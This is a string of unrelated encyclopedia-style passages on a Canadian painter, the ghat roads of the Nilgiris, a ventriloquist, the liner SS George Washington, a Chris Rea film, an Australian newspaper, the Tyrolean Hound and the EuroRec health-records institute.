paintings celebrating her prolific career. The Art Gallery of Ontario hosted an exhibition of McNicoll's work in 1999.  Style and works  McNicoll was consistently recognized in Canada for her treatment of light and air, bold use of color, and overall \\"quiet\\" artworks--possibly influenced by her deafness. Reviewers praised McNicoll's works for their sunny qualities. Subjects of her paintings typically included women, children, and rural landscapes.

Nearly all of the district is located in the Nilgiri Hills, part of the Western Ghats mountains. This area borders the states of Karnataka and Kerala. The hills consequently can be reached by road from three states. Most of these Ghat Roads go through heavily forested mountains and contain a number of sharp hair-pin bends.  Route Descriptions  There are five main Ghat Roads leading into the Nilgiris:  Kotagiri Ghat (State Highway 15)  Route: Erode-Gobichettipalayam-Sathyamangalam-Mettupalayam-Aravenu-Kotagiri-Ooty The Kotagiri Ghat is the oldest known route into the Nilgiris. It approximately follows the route taken by John Sullivan on his discovery trips in 1819. The distance between Mettupalayam and Kotagiri on this road is 33 km and it has only 4 hair pin bends. This road is part of State Highway 15. It is slightly less travelled as it is a slightly longer route from Mettupalayam to Ooty than the route via Coonoor, though as of 2012 the road condition is superior to the Coonoor Ghat road. It is also statistically less vulnerable to landslips. It is possible to divert from this route to Coonoor. There is a link from Aravenu to Bandishola. Travellers reach Mettupalayam from Coimbatore and from Chennai via Erode and Gobichettipalayam.  Coonoor Ghat (National Highway 67)  Route: Coimbatore-Mettupalayam-Kallar-Burliar-Coonoor-Ooty-Pykara This is also known as the Kallar Ghat, as it follows the valley of the Kallar and Coonoor rivers. It is by far the most traveled of all the Ghat Roads as it is the main access from the home state of Tamil Nadu. It has 14 numbered Hairpin bends and was recently (c.2003) taken over to be owned and maintained by the National Highways Authority of India and is now part of National Highway 181. Previously a toll had to be paid for vehicles entering the Nilgiris district at the village of Burliar, which also provides a rest stop on the route. The road was shut in 2010 due to landslides caused by heavy rains in the region. Subsequently, the National Highways Authority of India had the road re-laid which got eroded, again due to rains. In 2012, the Highways Department decided to initiate criminal proceedings against the NHAI, under Section 133 of Criminal Penal Code, dealing with acts endangering human life, due to non maintenance of the road.  Gudalur Ghat (National Highway 212 and 67)  Route: Gundlupet-Bandipur-Mudumalai-Gudalur-Ooty This is also simply known as the Mysore Ghat or Mysore Road. It is the main access route from Karnataka and Kerala. Travellers from Karnataka reach Gundlupet via the Mysore-Gundlupet National Highway 212 and travellers from Kerala reach Gudalur via the continuation of National Highway 212 from Kozhikode-Sultan Bathery. One traveller commented about this route: \\"The road from Mysore is arguably the most scenic with a long stretch that runs through the Mudumalai National Park, and if travelling in the early morning or late evening, you will definitely spot wildlife feeding along the road, even the odd carnivore. There are majestic stands of Eucalyptus amidst well tended tea estates as you near Gudalur, and then you drive past the Pykara Dam and Pykara falls\\". As with the Coonoor Ghat, from 2003-2006 this route was in a terrible state of repair. This route towards Gudalur from Ooty is the continuation of the same \\"National Highway\\" NH67 which makes up the Coonoor Ghat. National Highway 67 terminates in Gudulur where it joins National Highway 212 towards Gundlupet.  Sigur Ghat (State Highway 67)  Route: Mudumalai-Kalhatti-Ooty This is also known as Kalhatti Ghat (or simply 'Steep Ghat'). There is a short-cut branch off the Gudalur ghat at Theppakadu in Mudumalai. This route saves approx. 30 km on the standard Gudalur route, though it is by far the steeper route and is generally limited to short wheel-base vehicles. It has 36 hairpin bends and is closed overnight.  Manjur Ghat  Route: Karamadai(Coimbatore)-Athikadavu-Mulli- Geddai-Manjoor-Kundha Dam-Yedakadu-Mount Lawrence (Avalanji Road)-Emerald Cross Road-Muthurai Palada-Fern Hill-Ooty This is a smaller ghat for local Coimbatore city traffic towards Ooty, and is used as a backup road on the rare occasions that both the Coonoor Ghat and the Kotagiri Ghat are closed. The road is narrow with 48 hairpin bends below Manjoor. At Geddai, near the bottom of the ghat at there are two hydroelectric power stations . From Manjoor, at the top of the ghat, the distance is equidistant to either Ooty or Coonoor via other district roads. ODR.http://theindia.info/Blog/Ooty-by-Manjoor-Most- Beautiful-Road-to-Ooty-from-Coimbatore/ Ooty by Manjoor  Conditions  Until recently, all access roads to the Nilgiri hills were toll roads in order to facilitate the high maintenance costs. Roads are now in much better condition that a few years ago. However, it is not uncommon for a route to be closed for several days or even weeks due to landslips. If so traffic is usually diverted onto one of the other ghats. The Nilgiris have been totally cut off on all routes on rare occasions. As the supply infrastructure depends on these routes, any road activity (such as a closure) is reflected in the prices. During the main tourist season, a one-way system is implemented between the first two ghat roads mentioned. Uphill traffic goes from Coimbatore to Ooty via Coonoor, whereas downhill traffic goes from Ooty to Coimbatore via Kotagiri.

Ventriloquist act Lester claimed to have carved his dummy, Frank Byron Jr., himself when he was young. Coronet cited Frank Marshall of Chicago as his carver. The most likely provenance of Frank Byron Jr., however, indicates that he came from the Chicago workshop of Theo Mack & Son, probably a number of years before Frank Marshall was employed there. Called the \\"Grandfather of Modern-Day Ventriloquism\\", Lester claimed to be the first to drink while his dummy spoke; however, Joe Laurie notes that this trick was first performed in 1821. One of Lester's most noted acts was a bit where he called up Heaven and Hell in search of his sister. He was also the first ventriloquist to walk among the audience while his dummy whistled. Legacy Lester was also a noted teacher of the art of ventriloquism, having developed a rigorous program of breathing and speech articulation exercises. Students were encouraged to make tape recordings of their sessions with Lester and, as a result, there are many examples of his course to be heard and a number of student recordings have been made available commercially. Edgar Bergen, one of the most famous ventriloquists of all time, was one of the Great Lester's pupils. Lester's main figure, Frank Byron Jr., now resides at Vent Haven Museum in Fort Mitchell, Kentucky. Notes References *Laurie, Joe Jr. Vaudeville: From the Honky-tonks to the Palace.

The ship was also known as USS George Washington (ID-3018) and USAT George Washington in service of the United States Navy and United States Army, respectively, during World War I. In the interwar period, she reverted to her original name of SS George Washington. During World War II, the ship was known as both USAT George Washington and, briefly, as USS Catlin (AP-19), in a short, second stint in the U.S. Navy. When George Washington was launched in 1908, she was the largest German-built steamship and the third-largest ship in the world. George Washington was built to emphasize comfort over speed and was sumptuously appointed in her first- class passenger areas. The ship could carry a total of 2,900 passengers, and made her maiden voyage in January 1909 to New York. In June 1911, George Washington was the largest ship to participate in the Coronation Fleet Review by the United Kingdom's newly crowned king, George V. On 14 April 1912, George Washington passed a particularly large iceberg south of the Grand Banks of Newfoundland and radioed a warning to all ships in the area, including White Star Line ocean liner , which sank near the same location. Throughout her German passenger career, contemporary news accounts often reported on notable persons‚Äîtypically actors, singers, and politicians‚Äîwho sailed on George Washington. At the outbreak of World War I, George Washington was interned by the then-neutral United States, until that country entered into the conflict in April 1917. George Washington was seized by the United States and taken over for use as a troop transport by the U.S. Navy. Commissioned as USS George Washington (ID-3018), she sailed with her first load of American troops in December 1917. In total, she carried 48,000 passengers to France, and returned 34,000 to the United States after the Armistice. George Washington also carried U.S. President Woodrow Wilson to France twice for the Paris Peace Conference. George Washington was decommissioned in 1920 and handed over the United States Shipping Board (USSB), who reconditioned her for passenger service. SS George Washington sailed in transatlantic passenger service for both the United States Mail Steamship Company (one voyage) and United States Lines for ten years, before she was laid up in the Patuxent River in Maryland in 1931. During World War II, the ship was re-commissioned by the U.S. Navy as USS Catlin (AP-19) for about six months and was operated by the British under Lend-Lease, but her old coal-fired engines were too slow for effective combat use. After conversion to oil-fired boilers, the ship was chartered to the U.S. Army as USAT George Washington and sailed around the world in 1943 in trooping duties. The ship sailed in regular service to the United Kingdom and the Mediterranean from 1944 to 1947, and was laid up in Baltimore after ending her Army service. A fire in January 1951 damaged the ship severely, and she was sold for scrapping the following month.  Design and construction  The George Washington in 1909 1st Class cabin, 1909 Staircase, 1909 Wintergarden and Saloon, 1909 Children's playroom, 1909 SS George Washington was an ocean liner built within two years (1907‚Äì1908) by AG Vulcan of Stettin, Germany (now Szczecin, Poland), for North German Lloyd ( or NDL).Bonsor, p. 570. Intended for Bremen ‚Äì New York passenger service, the ship was named after George Washington, the first President of the United States as a way to make the ship more appealing to immigrants, who then made up the majority of transatlantic passengers and believed formalities on arrival would be easier on a ship with an American name. George Washington was launched on 10 November 1908 by the United States Ambassador to Germany, David Jayne Hill.The launching was originally scheduled for 31 October 1908, but was postponed due to low water in the Oder River. See: Drechsel, p. 374. At the time of her launch, she was the third-largest ocean liner in the world, behind only Cunard Line ships and .Bonsor, p. 533. George Washington also became the largest German-built steamship, surpassing the Hamburg America Line's , and held that distinction until the 1913 launch of Hamburg America's .Putnam, p. 164. After George Washington was completed, she was reported in contemporary news accounts as being , though present-day sources agree on a figure of . Her displacement was reported as being approximately , more than twice the 18420 t displacement of the British battleship . She was powered by two quadruple-expansion steam engines that generated and propelled her considerably faster than the guaranteed by her builders. Because she was designed to emphasize comfort over speed, George Washington's engines consumed an economical of coal daily, or about one-third as much as the Cunard speedsters Lusitania and Mauretania. By using less coal, and, consequently, needing less space to carry it, the liner was able to carry up to of cargo. The liner also featured the Stone-Lloyd system of hydraulically operated bulkhead doors for her thirteen watertight compartments. George Washington had accommodations for nearly 2,900 passengers, with 900 divided between first and second class and the balance as third class or steerage. The ship had only eight decks rather than a more typical nine, which gave her passenger accommodations a spacious feel. The first-class passenger section included 31 cabins with attached baths, and the liner's imperial suites were designed by German architect Rudolf Alexander Schr√∂der. The second-class, third-class, and steerage compartments were fitted out in a \\"comfortable manner\\" suitable for each class. The first class public rooms were \\"sumptuously appointed\\", and included murals by German fresco artist Otto Bollhagen that commemorated the life and times of George Washington. First-class passengers could visit a separate lounge, a reading room decorated by Bruno Paul, a two-story smoking room, and their own dining room that spanned the width of the ship. The upper and lower floors of the smoking room were joined by a broad staircase which helped, according to a report in The New York Times, make it \\"one of the most attractive parts\\" of the first-class areas. The dining saloon seated 350 diners at small tables designed for between two and six diners in \\"roomy and moveable\\" red Morocco chairs. The dining room was decorated in white and gold, with a gilded dome rising above, while its walls featured floral designs executed against a blue background. Other first-class passenger amenities aboard George Washington included a gymnasium with machines for \\"Swedish exercises\\", and two electric elevators for those who didn't want to exercise at all. There was also a darkroom open to amateur photographers; 20 dog kennels, along with a kennel master; a solarium decorated with green and gold tapestry, palms, and flowers of all kinds; and an open air cafe on the awning deck for taking after-dinner coffee. Second-class passengers had a separate dining room, a drawing room, and a smoking room, and third-class passengers had similar amenities.  North German Lloyd passenger service  George Washington began her maiden voyage on 12 June 1909, sailing from Bremen to New York via Southampton and Cherbourg. On board were 1,169 passengers which included a German press contingent; Philipp Heineken, the Generaldirektor of North German Lloyd; and a chimpanzee named Consul, billed as \\"his Darwinian Highness\\", the \\"Almost Monkey-Man\\", who was coming to America under contract for the William Morris Vaudeville circuit. Upon her arrival in New York on 20 June, George Washington was greeted by the unfurling of the official banner of the League of Peace from the Singer Building,The Singer Building, then the world's tallest building at , was shorter than George Washington was long. See: and docked at 18:30 at the North German Lloyd piers in Hoboken, New Jersey. Coincidentally, , an ocean liner of the unrelated Austro-American Line, was in port when George Washington docked in New York for the first time. The SS George Washington departs from New York City c. 1910 as confetti is thrown from her decks. On 22 June, the liner hosted a press luncheon, and, the next afternoon, hosted some 3,000 members of the Daughters of the American Revolution who presented a commemorative bronze tablet. Stewart L. Woodford, a former Congressman and ambassador, spoke at the ceremony dedicating the tablet, which was placed at the base of the staircase in the first-class smoking room. Beginning 24 June, the North German Lloyd opened George Washington to the public for five days of viewing of the new ship. Sailing on her first eastbound journey on 1 July, George Washington commenced regular service between Bremen and New York with intermediate stops in Southampton and Cherbourg. North German Lloyd considered the Washington, as her crew affectionately called her, such a success that they soon ordered another liner of similar, but slightly larger, size.Norddeutscher Lloyd, p. 68.The new ship, SS Columbus, was launched in 1913 and scheduled for her maiden voyage on 11 August 1914. The outbreak of the war cancelled her completion and the ship never sailed in passenger service for North German Lloyd. She was awarded to the United Kingdom as a war reparation and was renamed and sailed for the White Star Line. See: Drechsel, p. 433. On 24 June 1911, George Washington participated in the Coronation Fleet Review by the United Kingdom's newly crowned king, George V. Stationed at the head of the second row of merchant ships, George Washington‚Äîfull dressed for the occasionSee image of George Washington at the review in Drechsel, p. 374.‚Äîwas reported by The Times as \\"by far the largest ship present\\". While headed to New York on the morning of 14 April 1912, crew aboard George Washington observed a large iceberg as the ship passed south of the Grand Banks of Newfoundland. By noon the ship passed within a half mile (900 m) of the iceberg, estimated by the crew at above the waterline and long. After recording the ship's position, George Washington radioed a warning to all ships in the area. The White Star steamship , some east of George Washington's position, acknowledged receipt of the warning,Drechsel, pp. 33‚Äì34. one of several her radio operators received. On 15 April, George Washington received garbled transmissions that informed that Titanic had struck an iceberg less than twelve hours later, and in nearly the same position as the one that George Washington had reported. Edwin Drechsel, in his 2-volume chronicle of North German Lloyd, draws comparisons between the iceberg photographed by George Washington (and first published in his book),Drechsel's father, Willy Drechsel, was the Second Officer on George Washington in April 1912. and a better-known photo taken from the Hamburg America Line ship , purportedly of the Titanic iceberg. Drechsel suggests that the iceberg photographed and reported by George Washington may have been one and the same.Drechsel, p. 32.  Notable passengers  Throughout her Lloyd transatlantic career George Washington carried some notable and interesting passengers to and from Europe. In August 1909 Sigmund Freud sailed from Bremen bound for New York on his one and only trip to the US. He was accompanied by his colleagues Carl Jung and S√°ndor Ferenczi. In February 1910, banker Edgar Speyer, a Privy Counsellor appointed by Edward VII of the United Kingdom, arrived for a visit to the United States. Prince Tsai Tao, the uncle of the Emperor of China, departed in one of George Washington's imperial suites after a four-day visit to New York in May; the Chinese Imperial flag flew from the mainmast in his honor as the ship departed. In October, Henry W. Taft, brother of U.S. President William Howard Taft returned from a visit to Europe. In December, disgraced Arctic explorer Frederick Cook arrived on the liner; conflicting opinions on the veracity of his claims of reaching the North Pole nearly caused a fight to erupt on board. On the same voyage as Cook, German actor Ernst von Possart arrived for his first stage performances in New York in over 20 years. Composer Engelbert Humperdinck, after attending the debut of his opera K√∂nigskinder at the Metropolitan Opera, sailed on George Washington in early January 1911 in order to attend the opera's Berlin premiere. American sculptor George Grey Barnard returned to New York in April amidst controversy over some of his works. An organization called the National Society for Protection of Morals was protesting the presence of nude figures in sculptures he executed for the Pennsylvania State Capitol in Harrisburg. July saw George Washington transporting a menagerie of sorts. The liner was carrying a shipment from India of 6 white peacocks, 2 lions, 2 elephants, 150 monkeys, and some 2,000 canaries destined for the recently organized Saint Louis Zoological Park. In August, two men of note‚Äîboth headed for Berlin‚Äîsailed on George Washington. Nathan Straus, co-owner with his brother Isidor of R.H. Macy & Company, sailed as the U.S. delegate to the third world congress for the protection of infants held in Berlin. Congressman Richard Bartholdt, charged by President Taft to deliver a statue of Friedrich Wilhelm von Steuben to the German government, sailed with the statue, which was a gift from the American people. Financier and philanthropist J. P. Morgan, Jr. returned from a two-month trip to Europe in November 1912; his wife followed him home the next month. Also arriving on George Washington's November crossing was Mary Garden, a Scottish-born soprano, who was returning from a sabbatical in Scotland. The next month, opera singers Frieda Hempel and Leon Rains, both headed for appearances with the Metropolitan Opera, arrived on the same voyage as Mrs. Morgan. Hempel, a German soprano, was with the Berlin Royal Opera, and American tenor Rains was with the Saxon Royal Opera of Dresden. Newlyweds Francis B. Sayre, an assistant district attorney in New York, and Jessie Woodrow Wilson Sayre, the daughter of U.S. President Woodrow Wilson, sailed in November 1913 for a European honeymoon. The couple, wed at the White House, traveled in one of George Washington's imperial suites. The following January, English playwright W. Somerset Maugham quietly slipped out of New York on George Washington. Maugham had arrived in New York in mid November to see Billie Burke in the New York premiere of his play, The Land of Promise. Socialite and philanthropist Sarah Polk Fall, left for a six-month tour of Europe in August 1923. She was traveling First Class to England. Her daughter Saidee Grant and her husband New York Banker Rollin Grant, along with their servants accompanied her for the journey. They returned to New York in February 1924.  World War I  US Navy nurses crossing the Atlantic, December 1918 George Washington continued operating on the Bremen ‚Äì New York route until World War I when she sought refuge in New York, a neutral port in 1914. With the American entry into the war in 1917, George Washington was taken over 6 April and towed to the New York Navy Yard for conversion into a transport. She commissioned 6 September 1917, with Captain Edwin T. Pollock in command. George Washington sailed with her first load of troops 4 December 1917 and during the next 2 years made 18 round trip voyages in support of the American Expeditionary Forces. During this period she also made several special voyages. President Woodrow Wilson and the American representatives to the Paris Peace Conference sailed for Europe in George Washington 4 December 1918. On this crossing she was protected by , and was escorted into Brest, France, 13 December by ten battleships and twenty-eight destroyers in an impressive demonstration of American naval strength. After carrying 4000 soldiers back home to the U.S., George Washington carried Assistant Secretary of the Navy Franklin Roosevelt and the Chinese and Mexican peace commissions to France in January 1919. On 24 February, she returned President Wilson to the United States. The President again embarked on board George Washington in March 1919; arriving France 13 March, and returned at the conclusion of the historic conference 8 July 1919. During this voyage, the ship carried radiotelephone equipment, then a new technology, and during much of the trip Wilson was able converse with officials back in Washington.\\"The Alexanderson System for Long-Distance Radio Communication: Duplex Radio-Telephony\\".

The radio transmitter was also used to broadcast entertainment to the troops, and it was planned to broadcast Wilson's 4 July Independence Day speech to accompanying vessels, which would have been the first radio address by a U.S. president. However Wilson stood too far from the microphone, and the technicians were too intimidated to try to get him to stand in the correct spot.\\"Radiophone Transmitter on the U.S.S. George Washington\\".

During the fall of 1919, George Washington carried another group of distinguished passengers‚ÄîKing Albert and Queen Elizabeth of Belgium and their party. Arriving New York 2 October, the royal couple paid a visit before returning to Brest 12 November. Subsequently, the ship was decommissioned 28 November 1919 after having transported some 48,000 passengers to Europe and 34,000 back to the United States.

Interwar passenger service  After her delivery to the United States Shipping Board (USSB), George Washington was used to transport 250 members of the American Legion to France as guests of the French Government in 1921. The vessel was then reconditioned by USSB for transatlantic service, and chartered by the U.S. Mail Steamship Company, for whom she made one voyage to Europe in March 1921. The company was taken over by the government August 1921 and its name changed to the United States Lines. In 1930, she transported the first group of American Gold Star Mothers to France to visit the graves of their sons. George Washington served the Line on the transatlantic route until 1931 when she was laid up in the Patuxent River, Maryland.  World War II  George Washington was reacquired for Navy use from the United States Maritime Commission on 28 January 1941 and commissioned as USS Catlin (AP-19) on 13 March 1941. She was named in honor of Brigadier General Albertus W. Catlin, USMC. It was found, however, that the coal-burning engines did not give the required speed for protection against submarines, and she was decommissioned on 26 September 1941. Because of their great need for ships in 1941, Great Britain took the ship over under Lend- Lease on 29 September 1941 as George Washington, but they found after one voyage to Newfoundland that her aging boilers could not safely maintain sufficient steam pressure to drive her otherwise serviceable engines. A secondary contributing factor was the difficulty in manning her with sufficient skilled stokers ‚Äì the role having been supplanted with the steady introduction of oil fired ships in the 1930s.Bone, David W., E:Merchantman Rearmed, Chapter XIII. Chatto and Windus, London, 1949. With the ship unfit for combat service the British returned her to the War Shipping Administration (WSA) on 17 April 1942. The ship was next operated under General Agency Agreement by the Waterman Steamship Co., Mobile, Alabama, and made a voyage to Panama. After her return on 5 September 1942 the WSA assigned George Washington to be converted to an oil-burner at Todd Shipbuilding's Brooklyn Yard. When she emerged on 17 April 1943, the transport was chartered by the United States Army and made a voyage to Casablanca and back to New York with troops between April and May 1943. In July, George Washington sailed from New York to the Panama Canal, thence to Los Angeles and Brisbane, Australia. Returning to Los Angeles, she sailed again in September to Bombay and Cape Town, and arrived at New York to complete her round-the-world voyage in December 1943. In January 1944 George Washington began regular service to the United Kingdom and the Mediterranean, again carrying troops in support of the Allies in Europe. She made frequent stops at Le Havre, Southampton, and Liverpool. George Washington was taken out of service and returned to the Maritime Commission 21 April 1947. She remained tied to a pier at Baltimore, until a fire damaged her 16 January 1951. She was subsequently sold for scrap to the Boston Metals Corporation of Baltimore on 13 February 1951.

Hobbs, and starring Sean Gallagher, Paul Shane and Shirley Bassey. The film premiered on 14 November 1996 at the BFI London Film Festival. The film features a cameo appearance by Rea, as well the same-titled soundtrack also composed by him. It reached #43 position in UK album charts, and was certified Silver by BPI in 1997. Film The film was released in five UK cities cinema from 16 May 1997. It is a tale of 10-year-old northern boy, the son of an Italian immigrant ice-cream making family, who develops a lifelong obsession with motor racing and especially with the real-life racer Wolfgang Von Trips, who was killed in his sharknose Ferrari 156 at the Monza Grand Prix in 1961. The movie is partially inspired by Rea's childhood experience. Rea commented how \\"everyone's got a Von Trips in their life ... for some people it happened through football or movies - a day when a boy's empty, innocent mind suddenly has all kinds of new stuff blown into it\\". Rea initially wanted to direct his own screenplay but Warner Vision, the film's distributors, did not let him and appointed John B Hobbs, a retired television director. The studio executives kept trying to turn his simple tale of childhood fantasy into something else, with which he felt disappointed. Rea commented that \\"there was a lot of hard work in making La Passione, and a lot of grief, because I had very set ideas about how I wanted it to be, and everyone else had a different idea ... I wanted none of it. My thing was about how fantasies occur, about passions, enjoying them\\". In 2016 interview he recalls that Billy Connolly and Peter Capaldi were in advanced talks to star, but his original idea and script were changed. The primary idea was to be Warner Bros' first music DVD, \\"something to watch whilst you're listening to music\\". However, although they liked the idea and started to work on it, Rea lost complete control over it and under corporate pressure many people started to show up, with those especially from the USA not understanding the idea as it started to turn up into, as Rea felt, a \\"boring film\\". Soundtrack On the film soundtrack, Shirley Bassey provides vocals on two tracks. (La Passione and a duet with Chris Rea Shirley Do You Own A Ferrari).The song La Passione was a big hit for Dame Shirley Bassey. The soundtrack was redone in recent years with new music, and was re-released in November 2015 in a deluxe package which consists of two CDs, consisting of remastered and remixed original and new tracks, and two DVDs, first consisting of re-edited original and new short films to accompany the music along with an interview with Rea, while second of documentary about Wolfgang Von Trips, enclosed within a 72-page book.

It was one newspaper among the McPherson Media Group.  Origins  The newspaper was founded at Echuca on 1 July 1863, with its first editor as Robert Ross Haverfield (1819‚Äì1889) and joint owners James Joseph Casey (1831‚Äì1913) and Angus Mackay (1824‚Äì1886) - the latter also being one of the proprietors of the Bendigo Advertiser. Haverfield was a drover, grazier, gold miner, explorer and journalist. He was born on 26 February 1819 at Bideford, North Devon, England as the son of a Royal Navy Commander R.T. Haverfield, and his wife, n√©e Ross. He emigrated to Australia in 1838 where he went droving cattle from Albury to Melbourne, working an alluvial claim near Bendigo, and started the Bendigo Advertiser with A.M. Lloyd (which he later sold to Mackay). It became a daily on 1 July 1878, and continued until 31 March 1956, before reverting to a tri- weekly issue. In 1880 it was one of only two daily provincial newspapers circulated in New South Wales. In 1995 the Riverine Herald first provided local call Internet access to its community. Note/Correction: Local Call internet access was provided to the community by The Riverine Herald's parent company, the McPherson Media Group by their Internet Service Provider, McPherson Media. That particular arm of the group is to try and demonstrate media and news on all platforms, print, web and mobile. More info can be found at http://www.mcmedia.com.au.  Staff  In the same year as founding Riverine Herald as Echuca's first newspaper, Robert Ross married Marianna Collier. Newspaper proprietor and politician, Angus Mackay was born on 26 January 1824 in Aberdeen, Scotland. He had worked as a headmaster in Sydney prior to buying Haverfield's share in the Bendigo Advertiser and later helping to start The Riverine Herald. Journalist and short story writer William Astley (1854‚Äì1911) had work published by the Herald.  Editorial campaigns  The Riverine Herald has championed many causes throughout its history. These included calls for the de-snagging the Murray River so that it would be navigable, and the construction of weirs on it to assist irrigation which has made this one of Australia's major food bowl regions. The paper has also pushed for more environmental awareness with its \\"Minding the Murray\\" campaign and more recently played a pivotal role in Echuca Regional Health securing funding for a new Echuca Hospital.

They are scent hounds that descended from the celtic hounds in the late 1800s, mainly for their hunting skills. They are hardworking, passionate, and independent dogs not known for their size, but rather their intelligence. For that reason, hunters can regularly use these dogs to catch their prey, wounded or otherwise. Their ability to stretch over long distances, on rough hot or cold terrain for their prey is also another perk of keeping this dog by your side. Hunters do have to worry about injuries to their dog, however, along with the common injuries that these dogs obtain throughout their life, like hip dysplasia or ear infections. Barring any injuries, these dogs tend to live an energetic life for about 12-14 years, and tend to be an overall healthy and robust dog.  Description and history  The Tyrolean Hound, also known as the Tyroler Bracke, is a breed of scent hound originally developed in the 1800s from the Bracke hounds and the Celtic hounds. It was first bred in Tyrol as a dog adapted to hunting in the snow. Emperor Maximilian I used this hound for hunting hare and fox and for tracking wounded game. Breeding began in 1860, and then in 1896 the first standard of breeding was published. Followed shortly thereafter, the Tyrolean Hound was recognized as their own breed in 1908. It was not until 2006, that the Tyrolean Hound was recognized by the United Kennel Club. As with dogs that come from hardworking scent hound breeds, the Tyrolean hound was bred for their hunting ability. The breed is known for their excellent ability in being able to maneuver through mountainous or heavily wooded areas, and for their amazing scenting skills. This is all made possible with the size of the Tyrolean Hound. It tends to be a medium to large dog, measuring in at about 18.5 to 24 inches tall, and weighing about 35 to 60 pounds for males. Females tend to be smaller physically, only growing to be about 16.5 to 19 inches tall, however, both have a nice flowing outline and tend to be fairly muscular. The Tyrolean Hound, whether male or female, also has a thick double coat, with a coarse undercoat, as opposed to fine. They also tend to have the 3 main colors of red, black, and tan, with patches of white mixed in between.  Body breakdown   Head  The head of the Tyrolean Hound is fairly broad with a slight arch going down the middle. This arch continues into the deep and straight muzzle of the dog, ending down at either a black or brown nose, with black is more desirable. The teeth of the Tyrolean Hound should be spaced, and it would be normal to notice that the dog is missing one or two premolars. Above the snout, the eyes are not so deeply set, and tend to be dark brown, large, and round. Laying on top of the eye, the third eyelid should be pigmented and the eye rims should be close fitting. Above the eyes, this medium-sized hound has broad flat ears set high on the head with rounded ends. The ears can even reach up to the end of the nose when pulled forward.  Body  The body is compact and rectangular in shape. They have a thick double coat including a coarse undercoat. There are two main colors, red and black with some tan, both of which may have white markings. It has a fast gait and can be used for either tracking or hunting. They have a deep chest that is moderately broad with a muscular fore-chest. The shoulder blades and upper arms are sloping and form a near right angle. The withers are pronounced and the croup slopes gently down the dog. The forelegs are straight with a medium bone, while the hind legs are well feathered, broad, and muscular. Lastly, the tail is set high on the back with a saber curve. The tail is carried high when the dog is excited, and preferably presents feathered with a thick brush of fur.  Temperament  Like many working dogs, the Tyrolean hound is highly active, affectionate, and free-spirited. This is a highly intelligent dog and because of that, it tends to be very independent. While it can be stubborn from time to time, it can be easily trained. For this reason, the dog can make a good family pet, preferably with a big yard or constant access to an open field. While the dog can have an independent streak and may lead to misbehavior, hunters often appreciate the fact that this dog can hunt alone, following wounded game for long distances. They are widely respected for the ability to hunt in hot and cold weather and in most any terrain. They have a quick, ground covering, and enduring gait, which makes for a passionate hunter who is fast and efficient. Alert and lively, though wary of strangers, this dog can be a tenacious hunter all the way down to a great stay at home pet, almost as if it has an ability to \\"switch off\\" and come home to rest. While their lack of aggression limits their ability to be a guard dog, they still have a loud bark to warn anyone that something is amiss, making them great watch dogs.  Health   Lifespan and lifestyle  Tyrolean Hounds have an average life expectancy of about 12 to 14 years overall. These dogs are robust and generally healthy. They need to keep an active lifestyle and have high exercise requirements, though not hyperactive. As puppies, they should be given high-quality dry food until about 12 months when they can be transferred over to adult dry food. They can also take either active or working dog formulas, respectively with their lifestyle. When they are adults it can be necessary to keep them engaged with mental stimulation. Without such exercises or obedience training, they may lose passion in their work or other nuisance behaviors may appear. Also, with the harsh double coat that the Tyrolean Hound bares, they may need to be brushed once or two times a week along with other various health duties such as; teeth brushing, coat grooming, and a weekly ear cleaning.  Common health problems   Hip dysplasia  Hip dysplasia is often common in medium to larger sized dogs, especially when they are purebred. This is when the hip forms abnormally, leading to a chronic \\"wear and tear\\" leading to inflammation and osteoarthritis.  Hunting injuries  Hunting has its obstacles and hardships for the Tyrolean Hound; the uneven ground and the excess vegetation that may grow. There is also the rotten branches and even the prey they are hunting themselves that can strike back.  Ear infections  The large and droopy ears of the Tyrolean Hound make them very susceptible to infection, particularly when they go swimming. Any of the moisture or foreign debris that finds its way into the ear can cause bacteria and yeast build up, which leads to an ear infection. This can be maintained by cleaning out the ears whenever they come in from hunting, or by routinely cleaning them weekly.

On 13 May 2003, the institute was established as a non-profit organization under French law. Current President of EuroRec is Prof. Dipak Kalra. The institute is involved in the promotion of high quality Electronic Health Record systems in the European Union. One of the main missions of the institute is to support, as the European authorised certification body, EHRs certification development, testing and assessment by defining functional and other criteria. The objectives of the institute are: # To federate the established ProRec centres that comply with a set of explicit criteria. # To develop specifically those activities that cannot be handled at the level of ProRec centres and/or within their scope, according to the principle of subsidiarity and in view of both synergy and economy of scale. European projects ARGOS The main goal of the ARGOS project was to contribute to creating \\"Transatlantic Observatory for Meeting Global Health Policy Challenges through ICT-Enabled Solutions\\" to allow promotion of \\"Common Methods for Responding to Global eHealth Challenges in the EU and the US\\". The results are used to provide various users recommendations in sustaining co-ordinated actions. It is important to both Europe and America of United States because: *There is a barrier in fostering healthcare globally as citizens travel and migrate *It will help improve their products to better promote themselves in global markets *The global experiences will become important information for both Europe and America Through the challenges of enhancing ehealth strategy development, promoting benefits of consistent strategies and supporting large scale ehealth infrastructure implementations will allow Europe and United States researchers and policy makers gain mutual understanding and learning. The main topics that were address within this project was; ehealth interoperability an EHR certifications, establishing an approach and identification of indicators of the usage and benefits of ehealth, and aiding clinicians in diagnosis and treatment of rare diseases through human physiology and disease modelling and simulation. However the project has highlighted challenges in establishing competent ehealth informatics staff. There are variations of understanding, qualification and definition of workforce requirements through Europe and The United States. HITCH: Healthcare Interoperability Testing and Conformance Harmonisation HITCH project begun 01/01/10 and ended on the 30/06/11. The objective of this project was to involve major stakeholders in defining and agreeing a roadmap that is essential to the foundation for the Interoperability Conformance Testing of information systems in the field of healthcare. HITCH project aims to propose plans on achieving interoperability conformance testing foundation starting 2011 through evaluating existing approaches and identifying potential gaps in initiatives. The roadmap will identify specific needs in improving processes and tools development that will support research. The roadmap will be tested in real-world settings with healthcare IT applications to determine the next logicals steps in establishing a credibility amongst major stakeholders (vendors, users, patients and authorities). Q-REC: European Quality Labelling and Certification of Electronic Health Record systems (EHRs) The Q-REC project started 01/01/06 and finished on 30/06/08. It is a project that is a Specific Support Action and its objective is to supplement the existing e-Health ERA Co-ordination Project \\"Towards the establishment of a European e Health Research Area\\". Its aim is to create a credible, sustainable and efficient means of certifying EHR systems in Europe by concentrating EHR Systems Quality Labeling and Certification Development, Resources for EHR interoperatability, and Benchmarking Services. Some of the goals stated by Q-REC and EuroREC webpage includes: EHR Systems Quality Labelling and Certification Development *Developing a modern report on EHR- Certification Schemas that has been implemented in at least three European countries; *Completing a Pan-European Requirements Assay; *Proposing a Labelling Terminology and Functional Profiles for EHRs to be certified; *Comparing and harmonising the EHR-Certification Procedures at a European level; *Drafting Model Certification Guidelines and Procedures; *Planning the 